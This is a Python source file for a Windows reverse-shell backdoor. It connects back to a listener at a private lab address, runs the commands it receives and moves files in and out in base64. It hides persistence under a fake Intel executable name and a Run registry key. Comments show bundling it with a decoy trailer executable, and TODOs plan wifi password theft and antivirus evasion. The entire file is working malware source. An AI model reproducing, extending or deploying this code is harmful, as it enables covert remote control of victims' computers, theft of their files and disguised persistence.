#!/usr/bin/env python

import threading
import socket
import subprocess
import json
import os
import base64
import sys
import shutil
import time
# TODO add stealing wifi passwords
# TODO add try to reconnect every 5 minutes or something
# TODO find solution for bypassing AV


class Backdoor:
    def __init__(self, ip, port):
        self.become_persistent()
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data)

    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_system_command(self, string):
        try:
            # devnull is for when you convert to exe as no-console you need to prevent errors with this
            DEVNULL = open(os.devnull, "wb")
            return subprocess.check_output(string, shell=True, stderr=DEVNULL, stdin=DEVNULL)
        except subprocess.CalledProcessError:
            return "Error during command execution"

    def change_working_directory_to(self, path):
        os.chdir(path)
        return "[+] Changing working directory to " + path

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload successful"

    def become_persistent(self):
        # in here you are finding appdata location then rename your evil file to intelrs.exe
        evil_file_location = os.environ["appdata"] + "\\IntelRapidStorage.exe"
        if not os.path.exists(evil_file_location):
            shutil.copyfile(sys.executable, evil_file_location)
            # then you are copying current exe file to e_f_location
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v IntelTechnologies /t REG_SZ /d ' + evil_file_location, shell=True)

    def run(self):
        while True:
            command = self.reliable_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    command_result = ""
                    # sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_result = self.change_working_directory_to(command[1])
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                elif command[0] == "upload":
                    command_result = self.write_file(command[1], command[2])
                else:
                    command_result = self.execute_system_command(command)
            except Exception:
                command_result = "[-] Error during command execution"
            self.reliable_send(command_result)


# connection.send("\n [+] Connection established. \n")
# 1024 is buffer size of the packet that gonna be received

# file_name = sys._MEIPASS + "\BlueBall_trailer.exe"
# this is for pyinstaller to find the file in system sys._MEIPASS finds it in temp dir
# subprocess.Popen(file_name, shell=True)
while True:
    try:
        listen_ip = "10.0.2.15"
        listen_port = 4444
        my_backdoor = Backdoor(listen_ip, listen_port)
        my_backdoor.run()
    except Exception:
        reconnect_interval = 60
        time.sleep(reconnect_interval)

        # sys.exit()

